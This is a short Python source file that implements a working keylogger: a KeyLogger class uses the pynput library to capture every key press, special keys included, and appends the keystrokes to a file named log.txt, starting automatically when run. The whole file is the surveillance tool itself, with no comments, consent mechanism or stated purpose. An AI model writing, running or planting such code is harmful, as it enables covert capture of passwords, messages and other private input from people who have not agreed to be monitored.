import pynput.keyboard
class KeyLogger:
    def __init__(self):
        self.currentKey = ""

    def append_to_log(self, key_strike):
        self.currentKey = self.currentKey + key_strike
        with open("log.txt","a+",encoding="utf-8") as new_file:
            new_file.write(self.currentKey)
        self.currentKey = ""
        
    def evaluate_keys(self, key):
        try: 
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:	
                Pressed_key =  " "
            else:
                Pressed_key =  " " + str(key) + " "
        self.append_to_log(Pressed_key)


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.currentKey = ""
            keyboard_listener.join()

KeyLogger().start()